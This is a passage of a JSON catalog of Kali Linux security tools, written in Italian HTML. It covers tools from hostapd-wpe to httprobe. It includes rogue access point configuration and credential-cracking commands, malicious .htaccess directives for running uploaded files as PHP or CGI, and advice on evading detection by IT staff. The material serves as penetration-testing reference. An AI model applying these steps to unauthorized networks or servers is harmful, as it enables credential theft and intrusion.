iniziale in ambienti fisicamente accessibili, catturando credenziali domain tramite EAP o intercettando traffico di rete. La combinazione con Responder e particolarmente efficace per ottenere hash NTLMv2 utilizzabili in attacchi relay.</p><p>Per <strong>Security Awareness Assessment</strong>, dimostra ai team di sicurezza quanto facilmente i dispositivi mobili e laptop aziendali possano essere indotti a connettersi a reti malevole, evidenziando la necessita di configurazioni client robuste e policy di sicurezza WiFi stringenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I sistemi WIDS/WIPS (Wireless Intrusion Detection/Prevention) moderni sono in grado di rilevare attacchi KARMA analizzando la presenza di AP che rispondono a probe request multiple e incoerenti. La modalita Loud KARMA e particolarmente visibile poiche genera un numero anomalo di beacon frame. Client moderni (iOS 14+, Android 10+, Windows 10+) implementano MAC address randomization e validazione dei certificati che riducono significativamente l'efficacia dell'attacco.</p><p><strong>Impatto operativo:</strong> L'attacco richiede prossimita fisica al target e hardware dedicato, creando un rischio di esposizione dell'operatore. La creazione di un rogue AP puo interferire con reti WiFi legittime causando disconnessioni e problemi di connettivita che possono attirare l'attenzione del team IT. In ambienti con monitoring RF attivo, la finestra operativa puo essere molto ridotta.</p><p><strong>Mitigazioni:</strong> Utilizzare canali WiFi meno congestionati per ridurre interferenze. Limitare la potenza di trasmissione al minimo necessario. Configurare ACL MAC per targetizzare solo dispositivi specifici ed evitare catture accidentali. Pianificare sessioni brevi in orari con meno personale IT attivo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hostapd-wpe",
    "name": "hostapd-wpe",
    "version": "2.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostapd-wpe/",
    "desc": "Hostapd con Wireless Pwnage Edition patch per evil twin e credential harvesting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hostapd-WPE</strong> (Wireless Pwnage Edition) e una versione modificata del demone hostapd, originariamente sviluppata da Brad Antoniewicz, specificamente progettata per condurre attacchi evil twin contro reti WPA2-Enterprise. Il tool implementa un finto server RADIUS che accetta qualsiasi tentativo di autenticazione EAP, catturando le credenziali dei client che si connettono al falso Access Point. L'efficacia di WPE risiede nella sua capacita di gestire trasparentemente i protocolli di autenticazione enterprise piu comuni, inclusi PEAP, EAP-TTLS e EAP-TLS, registrando i challenge/response MSCHAPv2 che possono essere successivamente crackati offline. A differenza di hostapd-mana che si focalizza sugli attacchi KARMA, WPE e ottimizzato specificamente per il credential harvesting in ambienti enterprise dove le reti WiFi utilizzano autenticazione 802.1X con backend RADIUS.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Evil Twin Enterprise:</strong> Hostapd-WPE crea una replica esatta dell'Access Point enterprise target, clonando SSID, BSSID e parametri di autenticazione. Quando un client si connette al rogue AP, il server RADIUS integrato gestisce la negoziazione EAP accettando qualsiasi credenziale presentata, mentre registra internamente tutti i dati di autenticazione. Questo approccio e particolarmente efficace perche molti client WiFi non verificano correttamente il certificato del server RADIUS, connettendosi automaticamente al primo AP che presenta l'SSID atteso.</p><p><strong>Cattura MSCHAPv2 Challenge/Response:</strong> Il punto di forza di WPE risiede nella cattura dei challenge/response del protocollo MSCHAPv2, comunemente utilizzato come inner authentication in PEAP e EAP-TTLS. Ogni tentativo di autenticazione genera una coppia challenge/response che viene salvata in formato direttamente compatibile con tool di cracking come hashcat (mode 5500) e asleap. Per password deboli, il cracking puo richiedere pochi secondi, mentre per password complesse e possibile utilizzare servizi come crack.sh che garantiscono il cracking di qualsiasi hash MSCHAPv2.</p><p><strong>Logging Completo e Multi-Protocollo:</strong> WPE mantiene un log dettagliato di ogni tentativo di autenticazione in /var/log/hostapd-wpe.log, includendo MAC address del client, username presentato, tipo di protocollo EAP utilizzato e i dati crittografici catturati. Supporta simultaneamente PEAP, EAP-TTLS, EAP-FAST e EAP-TLS, permettendo di catturare credenziali indipendentemente dal protocollo configurato sui client target. Per EAP-TLS, cattura i certificati client che possono rivelare informazioni sulla PKI aziendale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Per utilizzare hostapd-wpe e necessario un adattatore WiFi che supporti la modalita AP. Il file di configurazione deve essere personalizzato con l'SSID della rete target e i certificati appropriati vengono generati automaticamente durante l'installazione.</p><pre><code># Configurazione in /etc/hostapd-wpe/hostapd-wpe.conf\n# Personalizza SSID e interfaccia\ninterface=wlan0\nssid=CorporateWiFi\nchannel=1\nwpa=2\nwpa_key_mgmt=WPA-EAP\nwpa_pairwise=CCMP\nieee8021x=1\neap_server=1\n\n# Avvio del rogue AP\nhostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n\n# Monitoraggio credenziali in tempo reale\ntail -f /var/log/hostapd-wpe.log\n\n# Cracking hash MSCHAPv2 catturati\nhashcat -m 5500 captured_hashes.txt wordlist.txt\nasleap -C challenge -R response -W wordlist.txt</code></pre><p>Per massimizzare l'efficacia, posizionarsi fisicamente vicino ai client target e utilizzare un'antenna direzionale. Considerare l'uso di un deauther su un'interfaccia separata per forzare la disconnessione dei client dalla rete legittima.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Penetration Testing di reti WiFi Enterprise</strong>, hostapd-wpe e lo strumento standard per verificare se i client aziendali sono configurati per validare correttamente i certificati RADIUS. Un test riuscito dimostra che un attaccante potrebbe ottenere credenziali di dominio semplicemente posizionando un rogue AP nelle vicinanze dell'ufficio, rappresentando un rischio critico per la sicurezza aziendale.</p><p>Durante operazioni di <strong>Red Team con accesso fisico</strong>, il tool viene utilizzato come vettore di ingresso iniziale per ottenere credenziali Active Directory valide. Le credenziali MSCHAPv2 catturate, una volta crackate, forniscono username e password di dominio che possono essere utilizzati per accesso VPN, email, o come punto di partenza per escalation laterale nella rete corporate.</p><p>Per <strong>Security Assessment delle configurazioni 802.1X</strong>, WPE permette di valutare sistematicamente la robustezza delle policy di sicurezza WiFi, identificando quali dispositivi e sistemi operativi accettano certificati non verificati e quali implementano correttamente il certificate pinning o la validazione della CA.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il rogue AP e rilevabile da sistemi WIDS che monitorano la comparsa di AP con SSID duplicati su canali diversi. I certificati self-signed generati da WPE differiscono da quelli del server RADIUS legittimo, e client configurati correttamente mostreranno un warning all'utente. Sistemi di monitoring come Cisco ISE possono correlare tentativi di autenticazione falliti sul server legittimo con la presenza di un rogue AP.</p><p><strong>Impatto operativo:</strong> La creazione dell'evil twin puo causare interferenze con la rete WiFi legittima, specialmente se si utilizza lo stesso canale. I client che si connettono al rogue AP perderanno la connettivita di rete se non viene configurato correttamente il forwarding del traffico, generando potenzialmente ticket di supporto IT che possono rivelare l'attacco in corso.</p><p><strong>Mitigazioni:</strong> Utilizzare un canale diverso dalla rete legittima per ridurre le interferenze. Configurare il forwarding del traffico internet per evitare che i client notino problemi di connettivita. Limitare la durata dell'attacco e operare in orari con meno supervisione IT. Utilizzare eaphammer come alternativa piu moderna che automatizza molti di questi passaggi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hosthunter",
    "name": "hosthunter",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hosthunter/",
    "desc": "Trova hostname associati a IP usando reverse DNS, SSL cert e API web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HostHunter</strong> è uno strumento Python per la discovery di hostname e domini associati a indirizzi IP utilizzando multiple fonti di intelligence. Combina reverse DNS lookup, analisi dei certificati SSL/TLS, query a VirusTotal API, e ricerche su Bing per identificare tutti i virtual host e domini ospitati su un determinato server. Questo è particolarmente utile durante la fase di reconnaissance quando si dispone solo di un indirizzo IP e si vogliono scoprire tutti i siti web ospitati, essenziale per ampliare la superficie di attacco in penetration testing e bug bounty.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Intelligence:</strong> Interroga simultaneamente multiple fonti per massimizzare i risultati: reverse DNS per i PTR record, analisi dei certificati SSL per estrarre CN e SAN, VirusTotal per dati storici, e Bing per hostname indicizzati. La correlazione tra fonti riduce i falsi negativi.</p><p><strong>SSL Certificate Analysis:</strong> Si connette alla porta 443 di ogni IP e analizza il certificato SSL/TLS, estraendo il Common Name (CN) e tutti i Subject Alternative Names (SAN). Questo rivela spesso hostname che non appaiono in DNS pubblici.</p><p><strong>Batch Processing:</strong> Può processare liste di migliaia di IP in modo efficiente con threading parallelo. Supporta input da file con un IP per riga e gestisce automaticamente timeout ed errori.</p><p><strong>Flexible Output:</strong> Esporta i risultati in formato CSV per analisi in spreadsheet, TXT per pipeline con altri tool, o output diretto su console. Include metadati come la fonte di ogni hostname trovato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HostHunter supporta sia analisi di singoli IP che elaborazione batch di liste.</p><pre><code># === SINGOLO IP ===\nhosthunter -i 93.184.216.34\n\n# === LISTA DI IP ===\n# Da file con un IP per riga\nhosthunter -f ip_list.txt\n\n# === OUTPUT FORMATTATO ===\n# Output CSV\nhosthunter -f ips.txt -o results.csv\n\n# Output TXT\nhosthunter -f ips.txt -o results.txt\n\n# === INTEGRAZIONI API ===\n# Con VirusTotal per dati aggiuntivi\nhosthunter -f ips.txt --vt-key YOUR_VIRUSTOTAL_API_KEY\n\n# === OPZIONI AVANZATE ===\n# Aumenta il threading per velocità\nhosthunter -f ips.txt -t 50\n\n# Solo SSL analysis (più silenzioso)\nhosthunter -f ips.txt --ssl-only\n\n# === PIPELINE ===\n# Combina con altri tool\nnmap -sL -n 192.168.1.0/24 | awk '{print $5}' > ips.txt\nhosthunter -f ips.txt -o hosts.csv</code></pre><p>I risultati mostrano ogni hostname trovato con l'IP associato e la fonte della discovery.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Asset Discovery</strong>, quando si ha un range IP di un'organizzazione, HostHunter rivela tutti i virtual host e domini ospitati, espandendo significativamente la superficie di attacco conosciuta oltre i domini già noti.</p><p>Nel <strong>Bug Bounty</strong>, trovare altri siti web sullo stesso server può rivelare applicazioni legacy, staging environment, o siti dimenticati che potrebbero avere vulnerabilità più facili da sfruttare rispetto al target principale.</p><p>Durante <strong>Penetration Testing</strong>, la discovery di hostname permette di identificare applicazioni web che potrebbero essere vulnerabili a host header injection, virtual host routing issues, o che espongono informazioni sensibili.</p><p>Per <strong>Threat Intelligence</strong>, correlare IP di infrastrutture malevole con i domini associati aiuta a mappare l'intera infrastruttura di un threat actor.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Profilo Misto:</strong> Il tool utilizza sia tecniche passive che attive. Le query DNS reverse e VirusTotal sono passive e non raggiungono il target. L'analisi SSL richiede connessione diretta al target sulla porta 443, generando log sul server.</p><p><strong>Rate Limiting:</strong> VirusTotal ha limiti sulle API gratuite (4 query/minuto). Le query Bing possono essere bloccate se troppo aggressive. Usare delay tra le richieste per evitare blocchi.</p><p><strong>Completezza Risultati:</strong> I risultati dipendono dalla disponibilità delle fonti. Certificati self-signed, IP senza PTR record, o servizi non indicizzati non verranno rilevati. Usare in combinazione con altri tool di enumeration.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "hostsman",
    "name": "hostsman",
    "version": "1.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hostsman/",
    "desc": "Enumera virtual host su web server analizzando risposte HTTP a diversi hostname.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HostsMan</strong> è uno strumento specializzato per l'enumerazione di virtual host (vhost) su web server. Sfrutta il fatto che molti server web ospitano più siti sullo stesso IP, differenziandoli tramite l'header HTTP Host. Inviando richieste con hostname diversi da una wordlist, HostsMan identifica vhost nascosti o non pubblicamente linkati che rispondono sullo stesso server target, espandendo significativamente la superficie d'attacco durante un assessment.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Header Fuzzing:</strong> Invia richieste HTTP identiche variando solo l'header Host con valori da una wordlist. Questo permette di scoprire siti configurati sul server che non hanno record DNS pubblici o non sono linkati da altre pagine.</p><p><strong>Response Comparison:</strong> Analizza le risposte HTTP (status code, content length, contenuto) per identificare hostname che producono risposte diverse dalla baseline, indicando la presenza di un vhost configurato.</p><p><strong>Smart Filtering:</strong> Supporta filtri per status code, lunghezza della risposta, e pattern nel contenuto per eliminare falsi positivi e concentrarsi solo su vhost realmente diversi.</p><p><strong>SSL/TLS Support:</strong> Funziona trasparentemente su connessioni HTTPS, importante per server moderni che usano TLS. Può ignorare errori di certificato per vhost con certificati self-signed o mismatch.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HostsMan richiede l'URL target e una wordlist di potenziali hostname.</p><pre><code># Enumerazione vhost base\nhostsman -u http://192.168.1.100 -w vhosts.txt\n\n# Su HTTPS con ignore certificate errors\nhostsman -u https://target.com -w vhosts.txt -k\n\n# Filtra risposte 404 (non trovato)\nhostsman -u http://target.com -w vhosts.txt --fc 404\n\n# Filtra per content length (es. pagina default)\nhostsman -u http://target.com -w vhosts.txt --fl 1234\n\n# Output verbose con dettagli risposte\nhostsman -u http://target.com -w vhosts.txt -v\n\n# Usa dominio base per generare varianti\nhostsman -u http://target.com -w common_prefixes.txt --domain target.com</code></pre><p>Le wordlist efficaci includono: prefissi comuni (dev, staging, admin, api, test), nomi applicativi, e varianti del dominio principale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Bug Bounty</strong>, molti programmi considerano in-scope tutti i vhost sugli stessi server dei target principali. Scoprire dev.target.com o api-internal.target.com può rivelare applicazioni meno protette con vulnerabilità facili.</p><p>Nel <strong>Penetration Testing</strong>, l'enumerazione vhost è parte essenziale della fase di reconnaissance, rivelando applicazioni interne, pannelli admin, o ambienti di staging accessibili dall'esterno.</p><p>Per <strong>Asset Discovery</strong>, aiuta a mappare completamente l'infrastruttura web di un'organizzazione, identificando applicazioni dimenticate o non documentate.</p><p>Durante <strong>Red Team Operations</strong>, vhost nascosti spesso hanno controlli di sicurezza più deboli e possono fornire punti d'ingresso alternativi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico HTTP attivo verso il target. Il pattern di richieste con Host header variabili può essere identificato da WAF e sistemi di logging. Il volume di richieste dipende dalla dimensione della wordlist.</p><p><strong>Alternative:</strong> Tool simili includono gobuster con modalità vhost, ffuf con fuzzing dell'header Host, e wfuzz. La scelta dipende dalle preferenze e dalle funzionalità specifiche necessarie.</p><p><strong>Impatto:</strong> Basso. Le richieste sono leggere e non causano carico significativo. Tuttavia, wordlist molto grandi possono generare traffico notevole.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "htshells",
    "name": "htshells",
    "version": "0.1~git20131205",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/htshells/",
    "desc": "Collezione di .htaccess backdoor per eseguire comandi su server Apache vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTShells</strong> e una collezione curata di file .htaccess malevoli progettati per ottenere esecuzione di codice remoto su server web Apache che permettono l'upload o la modifica di file .htaccess. Il progetto, sviluppato come risorsa di ricerca sulla sicurezza, raccoglie diverse tecniche che sfruttano direttive Apache legittime per scopi offensivi, dimostrando come una configurazione permissiva di AllowOverride possa trasformarsi in un vettore di compromissione critico. Le tecniche incluse variano dall'abuso di AddHandler per eseguire file con estensioni arbitrarie come PHP, all'utilizzo di php_value per iniettare codice tramite auto_prepend_file, fino all'attivazione di moduli CGI per eseguire script arbitrari. HTShells e particolarmente rilevante in scenari dove un attaccante ha la possibilita di caricare file sul server ma i filtri impediscono l'upload diretto di script PHP o altre estensioni eseguibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Bypass dei Filtri di Upload:</strong> La principale forza di HTShells risiede nella capacita di aggirare i controlli sui file upload che si basano sull'estensione del file. Caricando un file .htaccess opportunamente configurato, e possibile far interpretare come PHP file con estensioni innocue come .jpg, .gif o .txt. Ad esempio, la direttiva AddType application/x-httpd-php .jpg istruisce Apache a processare tutti i file .jpg come codice PHP nella directory corrente, permettendo di caricare una webshell rinominata con estensione immagine.</p><p><strong>Tecniche di Esecuzione Multipla:</strong> La collezione include diverse strategie per ottenere code execution, ciascuna adatta a differenti configurazioni server. Alcune tecniche utilizzano php_value auto_prepend_file per iniettare codice PHP in ogni richiesta, altre abilitano moduli CGI per eseguire script Python o Perl, e altre ancora sfruttano ErrorDocument per eseguire codice tramite pagine di errore personalizzate. Questa varieta di approcci aumenta le probabilita di trovare una tecnica funzionante anche su server con configurazioni restrittive.</p><p><strong>Shell e Payload Pronti all'Uso:</strong> Oltre ai file .htaccess stessi, il progetto include payload complementari come webshell minimali, script CGI e file di test che permettono di verificare rapidamente quale tecnica funziona sul target. Ogni tecnica e documentata con commenti che spiegano quali direttive Apache sono necessarie e quali versioni sono compatibili, facilitando l'adattamento a scenari specifici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I file di HTShells si trovano nella directory di installazione Kali e sono organizzati per tecnica. L'utilizzo tipico prevede l'identificazione della tecnica appropriata per il target e il successivo upload del file .htaccess tramite la vulnerabilita di upload disponibile.</p><pre><code># Esplora le tecniche disponibili\nls /usr/share/htshells/\n\n# Esempio 1: AddType per eseguire .jpg come PHP\n# Contenuto .htaccess:\n# AddType application/x-httpd-php .jpg\n# Poi carica shell.jpg contenente codice PHP\n\n# Esempio 2: auto_prepend_file per injection\n# Contenuto .htaccess:\n# php_value auto_prepend_file /tmp/shell.php\n\n# Esempio 3: CGI execution\n# Contenuto .htaccess:\n# Options +ExecCGI\n# AddHandler cgi-script .txt\n# Poi carica script CGI come file.txt\n\n# Verifica se .htaccess e processato\ncurl -v https://target.com/upload_dir/.htaccess</code></pre><p>E importante verificare preventivamente che il server target sia Apache e che AllowOverride sia configurato in modo permissivo. La direttiva AllowOverride None disabilita completamente il processing dei file .htaccess, rendendo tutte le tecniche inefficaci.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Application Penetration Testing</strong>, HTShells viene utilizzato quando si identifica una funzionalita di upload che filtra le estensioni dei file ma non impedisce il caricamento di .htaccess. Questo scenario e sorprendentemente comune in applicazioni web che implementano whitelist o blacklist di estensioni senza considerare i file di configurazione del server. La capacita di manipolare il comportamento di Apache tramite .htaccess trasforma un upload apparentemente innocuo in un vettore di Remote Code Execution.</p><p>Durante i <strong>CTF (Capture The Flag)</strong>, le sfide di file upload spesso richiedono tecniche creative per aggirare filtri sempre piu sofisticati. Le tecniche di HTShells forniscono un repertorio di approcci collaudati che possono essere combinati e adattati per superare controlli basati su estensione, MIME type, magic bytes e content inspection.</p><p>Per la <strong>formazione sulla sicurezza di Apache</strong>, la collezione serve come materiale didattico per comprendere le implicazioni di sicurezza delle diverse direttive di configurazione e l'importanza di limitare AllowOverride al minimo necessario, illustrando concretamente come funzionalita legittime possano essere abusate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I WAF (Web Application Firewall) moderni possono ispezionare il contenuto dei file uploadati e rilevare direttive Apache sospette come AddHandler, php_value o Options +ExecCGI. I file .htaccess modificati possono essere rilevati da sistemi di file integrity monitoring come OSSEC o Tripwire. Log di Apache mostreranno il processing del file .htaccess e eventuali errori di configurazione.</p><p><strong>Impatto operativo:</strong> Le modifiche al file .htaccess influenzano l'intera directory e le subdirectory, potenzialmente alterando il comportamento del sito web per tutti gli utenti. Un .htaccess mal configurato puo causare errori 500 visibili, attirando immediatamente l'attenzione degli amministratori. Le tecniche funzionano solo su Apache con AllowOverride appropriato e non sono applicabili a Nginx, IIS o altri web server.</p><p><strong>Mitigazioni:</strong> Verificare la configurazione del target con una richiesta di test prima di uploadare payload complessi. Utilizzare direttive minimali per ridurre il rischio di errori. Ripristinare il file .htaccess originale dopo il completamento del test. Documentare tutte le modifiche apportate per il report finale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "httprint",
    "name": "httprint",
    "version": "0.301",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httprint/",
    "desc": "Web server fingerprinting tool che identifica software anche dietro reverse proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTTPrint</strong> e uno strumento specializzato nel fingerprinting di web server che identifica il software e la versione in esecuzione analizzando pattern comportamentali specifici nelle risposte HTTP, piuttosto che basarsi esclusivamente sui banner dichiarati dal server. Sviluppato originariamente da net-square, il tool utilizza un approccio basato su signature matching che confronta le risposte del server a una serie di richieste HTTP appositamente crafted con un database di comportamenti noti per diversi web server. Questa metodologia lo rende efficace anche quando il server ha rimosso o falsificato il banner Server header, o quando e posizionato dietro un reverse proxy o un load balancer. HTTPrint analizza aspetti come l'ordine degli header nelle risposte, il formato dei messaggi di errore, il comportamento con metodi HTTP non standard e le risposte a richieste malformate, costruendo un profilo comportamentale unico per ciascun server che viene poi confrontato con le signature nel database.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Behavioral Fingerprinting:</strong> Anziche limitarsi a leggere il banner del server, HTTPrint invia una serie di richieste HTTP appositamente progettate e analizza le risposte in dettaglio. Ogni web server ha comportamenti caratteristici unici nel modo in cui gestisce richieste malformate, metodi sconosciuti, URL lunghi e header non standard. Questo approccio permette di identificare con precisione il software anche quando l'amministratore ha deliberatamente modificato o rimosso le informazioni di versione dal banner.</p><p><strong>Database di Signature Esteso:</strong> Il tool include un database di signature che copre i web server piu comuni, inclusi Apache, IIS, Nginx, Lighttpd, e molti altri. Ogni signature e composta da un insieme di risposte attese a test specifici, con un sistema di scoring che calcola la probabilita di corrispondenza. Il database e aggiornabile e l'utente puo aggiungere signature personalizzate per server proprietari o versioni non ancora catalogate.</p><p><strong>Report e Output Multipli:</strong> HTTPrint genera report dettagliati in formato HTML con grafico di confidenza per ogni match, oltre a supportare output testuale per integrazione in script e pipeline automatizzate. Il report include il dettaglio di ogni test eseguito e la risposta ottenuta, permettendo un'analisi manuale approfondita quando il matching automatico non produce risultati definitivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HTTPrint opera da linea di comando e richiede il file delle signature per il matching. L'output puo essere diretto a file HTML per una visualizzazione dettagliata con grafici di confidenza.</p><pre><code># Fingerprint di un singolo server\nhttprint -h target.com -s /usr/share/httprint/signatures.txt\n\n# Fingerprint su porta non standard\nhttprint -h target.com:8080 -s /usr/share/httprint/signatures.txt\n\n# Connessione HTTPS (disabilita SSL check)\nhttprint -h target.com -P0 -s /usr/share/httprint/signatures.txt\n\n# Generazione report HTML\nhttprint -h target.com -s /usr/share/httprint/signatures.txt -o report.html\n\n# Scansione di piu host da file\nhttprint -i hosts.txt -s /usr/share/httprint/signatures.txt</code></pre><p>E importante notare che HTTPrint e un tool relativamente datato e il database di signature potrebbe non includere le versioni piu recenti dei web server. Per ambienti moderni, considerare l'integrazione con strumenti come WhatWeb, Wappalyzer o httpx per un fingerprinting piu aggiornato e completo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Reconnaissance</strong>, HTTPrint viene utilizzato per determinare il software del web server target quando il banner e stato rimosso o offuscato. Questa informazione e fondamentale per selezionare exploit appropriati, identificare vulnerabilita note tramite CVE matching e comprendere l'architettura dell'infrastruttura web. La capacita di bypassare tecniche di banner hiding lo rende utile quando altri metodi di fingerprinting piu semplici falliscono.</p><p>Nel <strong>Vulnerability Assessment</strong> di infrastrutture web, il tool aiuta a costruire un inventario accurato dei web server in uso, associando ciascuno alla versione specifica. Questo permette di correlare i risultati con database di vulnerabilita come NVD per identificare server non patchati o con vulnerabilita note, prioritizzando gli interventi di remediation.</p><p>Per l'<strong>analisi di architetture complesse</strong>, HTTPrint puo rivelare la presenza di reverse proxy, load balancer o WAF analizzando discrepanze nei comportamenti HTTP, contribuendo alla mappatura dell'infrastruttura di rete e identificando punti di ingresso potenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> HTTPrint genera richieste HTTP anomale e deliberatamente malformate che sono facilmente identificabili nei log del web server e possono attivare regole IDS/WAF. Le richieste includono metodi HTTP non standard, URL con caratteri speciali e header inusuali che si distinguono chiaramente dal traffico web normale. Sistemi come ModSecurity o Cloudflare WAF possono bloccare queste richieste e segnalare l'attivita come sospetta.</p><p><strong>Impatto operativo:</strong> Le richieste di test possono generare errori nei log del server target, potenzialmente attirando l'attenzione degli amministratori. In ambienti con monitoring attivo, la serie di richieste anomale in rapida successione e un pattern riconoscibile. Il tool non supporta proxy o rate limiting nativo, limitando le opzioni per mascherare l'attivita.</p><p><strong>Mitigazioni:</strong> Intervallare le scansioni HTTPrint con traffico web normale per ridurre la visibilita. Utilizzare il tool durante periodi di alto traffico per mimetizzarsi. Considerare l'uso di WhatWeb o httpx come alternative piu discrete che generano richieste meno anomale. Verificare i risultati manualmente prima di procedere con exploit basati sul fingerprint ottenuto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "httprobe",
    "name": "httprobe",
    "version": "0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/httprobe/",
    "desc": "Verifica rapidamente quali domini di una lista hanno server HTTP/HTTPS attivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HTTProbe</strong>, sviluppato da Tom Hudson (tomnomnom), e un tool leggero e veloce progettato per verificare quali domini da una lista hanno effettivamente un server HTTP o HTTPS attivo e raggiungibile. In una pipeline di bug bounty o penetration testing, dopo la fase di subdomain enumeration che produce centinaia o migliaia di domini, HTTProbe agisce come filtro critico eliminando i domini che non hanno servizi web attivi, permettendo di concentrare le risorse solo sui target effettivamente raggiungibili. Il tool legge input da stdin e scrive su stdout i domini che rispondono con successo a una connessione HTTP o HTTPS, rendendolo perfettamente integrabile in pipeline Unix con altri strumenti come subfinder, amass, httpx e nuclei. HTTProbe gestisce automaticamente i timeout e le connessioni concorrenti per massimizzare la velocita di verifica anche su liste molto estese.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Probing HTTP/HTTPS Concorrente:</strong> HTTProbe testa simultaneamente sia HTTP (porta 80) che HTTPS (porta 443) per ogni dominio nella lista, utilizzando goroutine concorrenti per parallelizzare le connessioni. Il livello di concorrenza e configurabile, permettendo di bilanciare velocita e carico di rete. Per ogni dominio che risponde, l'output include il protocollo e la porta utilizzata, fornendo una visione immediata dei servizi web disponibili.</p><p><strong>Porte Custom e Protocolli Specifici:</strong> Oltre alle porte standard 80 e 443, HTTProbe supporta la verifica su porte personalizzate tramite il flag -p, permettendo di testare servizi web su porte non standard come 8080, 8443, 3000 o qualsiasi altra porta. E possibile specificare il protocollo (http o https) per ciascuna porta, evitando tentativi inutili e riducendo il tempo di scansione. Questa funzionalita e essenziale per scoprire servizi di sviluppo, pannelli di amministrazione o applicazioni che operano su porte non convenzionali.</p><p><strong>Integrazione Pipeline e Formato Output:</strong> HTTProbe e progettato seguendo la filosofia Unix di tool specializzati che comunicano tramite stdin/stdout. L'output e una linea per dominio raggiungibile con URL completo (protocollo + dominio + porta), pronto per essere passato direttamente a tool successivi nella pipeline. Il flag -s sopprime le porte standard nell'output per URL piu puliti, mentre il supporto per prefer-https evita duplicati quando entrambi i protocolli rispondono.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HTTProbe si utilizza tipicamente come step intermedio in una pipeline di reconnaissance, posizionato tra la fase di subdomain enumeration e quella di vulnerability scanning o analisi approfondita.</p><pre><code># Verifica base di una lista di domini\ncat subdomains.txt | httprobe\n\n# Solo HTTPS su porta standard\ncat subdomains.txt | httprobe -s -p https:443\n\n# Test su porte non standard\ncat subdomains.txt | httprobe -p http:8080 -p https:8443 -p http:3000\n\n# Pipeline completa: discovery -> probe -> scan\nsubfinder -d target.com -silent | httprobe -s | nuclei -t cves/\n\n# Con concorrenza personalizzata\ncat large_list.txt | httprobe -c 100 -t 5000\n\n# Preferisci HTTPS ed evita duplicati\ncat domains.txt | httprobe --prefer-https</code></pre><p>Per liste molto grandi (100k+ domini), e consigliabile aumentare il limite di file descriptor del sistema operativo e utilizzare un livello di concorrenza appropriato per evitare problemi di rete o di risorse di sistema.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Bug Bounty</strong>, HTTProbe e un passaggio fondamentale nella pipeline di reconnaissance per filtrare rapidamente i risultati di subdomain enumeration, identificando solo i domini con servizi web attivi su cui condurre ulteriore analisi. Programmi di bug bounty con scope ampi possono generare migliaia di subdomain, e testare ciascuno manualmente sarebbe impraticabile senza un tool di probing automatizzato.</p><p>Durante la fase di <strong>Asset Discovery</strong> in un 